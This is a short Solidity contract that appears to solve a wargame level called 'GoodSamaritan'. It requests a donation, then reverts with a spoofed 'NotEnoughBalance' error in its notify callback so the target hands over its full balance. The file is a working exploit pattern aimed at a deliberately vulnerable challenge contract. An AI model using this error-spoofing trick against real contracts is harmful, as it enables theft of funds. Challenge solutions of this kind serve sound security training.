// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./27GoodSamaritan.sol";

error NotEnoughBalance();

contract GoodSamaritanSolution {
    GoodSamaritan public goodSamaritan;

    constructor(address goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(goodSamaritanAddress);
    }

    function solveChallenge() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) revert NotEnoughBalance();
    }
}
